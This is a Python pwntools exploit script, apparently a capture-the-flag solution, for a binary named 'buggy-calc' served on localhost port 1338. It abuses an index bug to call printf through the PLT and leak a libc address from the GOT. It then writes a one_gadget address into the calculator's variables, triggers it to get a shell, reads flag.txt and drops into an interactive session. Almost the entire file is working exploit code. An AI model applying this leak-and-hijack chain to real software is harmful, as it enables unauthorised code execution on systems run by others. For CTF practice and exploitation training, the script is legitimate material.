from pwn import *

exe = './buggy-calc'

(host,port_num) = ("localhost",1338)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * 0x4014da
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes)
rvu = lambda msg        : p.recvuntil(msg)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

p = start()

# THE FOLLOWING BUG IS THE FACT THAT WE CAN GIVE IDX 0 TO CALL A FUNCTION IN 
# INDEX -1 WHICH IS CONTROLLED BY THE VARIABLES IN THE CALCULATOR
printfgot = 0x404028
rvu(b"EXIT")
sl(b"5")
rvu(b"USE VARIABLE\n")
sl(b"1")
rvu(b">>")
sl(b"3")
rvu(b"value - ")
sl(str(0x4010a0).encode())

# CALLING PRINTFPLT TO LEAK LIBC PRINTING OUT PRINTFGOT 
rvu(b"EXIT")
sl(b"0")
rvu(b" a : ")
sl(str(0x404028).encode())
rvu(b" b : ")
sl(str(0x404028).encode())

# PARSING THE LIBC LEAK
libc = u64(rvu(b"Result")[:-6:].ljust(8,b"\x00")) - 0x606f0
one_gadget = libc + 0xebc88

# SETTING ONE_GADGET ADDRESS USING THE VARIABLES
# YOU CAN DO A system("sh") CALL ALSO SINCE YOU CAN FIND IT IN THE STRING - 
# printf("The variable has been put in the sta'sh'");

rvu(b"EXIT")
sl(b"5")
rvu(b"USE VARIABLE\n")
sl(b"1")
rvu(b">>")
sl(b"3")
rvu(b"value - ")
sl(str(one_gadget & 0xffffffff).encode())

rvu(b"EXIT")
sl(b"5")
rvu(b"USE VARIABLE\n")
sl(b"1")
rvu(b">>")
sl(b"4")
rvu(b"value - ")
sl(str((one_gadget & (0xffffffff << (8*4))) >> (8*4)).encode())

# DOING THE FINAL CALL
rvu(b"EXIT")
sl(b"0")
rvu(b" a : ")
sl(str(0x0).encode())
rvu(b" b : ")
sl(str(0x0).encode())

sl("cat flag.txt")

p.interactive()